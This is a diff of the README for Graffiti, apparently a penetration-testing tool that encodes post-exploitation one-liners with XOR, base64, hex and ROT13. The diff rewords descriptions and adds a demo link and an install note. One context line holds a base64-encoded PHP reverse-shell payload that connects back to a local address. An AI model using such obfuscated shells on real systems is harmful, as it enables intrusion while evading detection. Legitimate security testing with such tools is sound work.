@@ -2,7 +2,7 @@
 
 ###### _***NOTE***: Never upload payloads to online checkers_
 
-Graffiti is a tool designed to encode short scripting commands that will help penetration testers during the post exploitation phase. Graffiti accepts the following languages:
+Graffiti is a tool to generate obfuscated oneliners to aid in penetration testing situations. Graffiti accepts the following languages for encoding:
  
  - Python
  - Perl
@@ -11,15 +11,16 @@ Graffiti is a tool designed to encode short scripting commands that will help pe
  - PHP
  - Bash
 
-Even though your language may not be on this list, graffiti will still accept your data and store it in a database for later use.
+Graffiti will also accept a language that is not currently on the list and store the oneliner into a database.
 
 # Features
 
-Graffiti also comes complete with a database that will cache each encoded payload into itself in order to allow end users to view already created payloads for future use. The payloads can be encoded using the following techniques:
+Graffiti comes complete with a database that will insert each encoded payload into it, in order to allow end users to view already created payloads for future use. The payloads can be encoded using the following techniques:
 
  - Xor
  - Base64
  - Hex
+ - ROT13
  - Raw
 
 Some features of Graffiti include:
@@ -135,9 +136,13 @@ php -r 'exec(base64_decode("JHNvY2s9ZnNvY2tvcGVuKCIxMjcuMC4wLjEiLDkwNjUpO2V4ZWMo
 --------------------------------------------------
 ```
 
+A demo of Graffiti can be found here:
+
+[![to_video](https://user-images.githubusercontent.com/14183473/49241257-e7a49100-f3cc-11e8-96bb-134dc0724311.png)](https://vimeo.com/303548362)
+
 # Installation
 
-On any Linux, Mac, or Windows system, Graffiti should work out of the box without the need to install any external packages. If you would like to install Graffiti as an executable onto your system, all you have to do is the following:
+On any Linux, Mac, or Windows system, Graffiti should work out of the box without the need to install any external packages. If you would like to install Graffiti as an executable onto your system (you must be running either Linux or Mac for it to work successfully), all you have to do is the following:
 
 ```bash
 ./install.sh
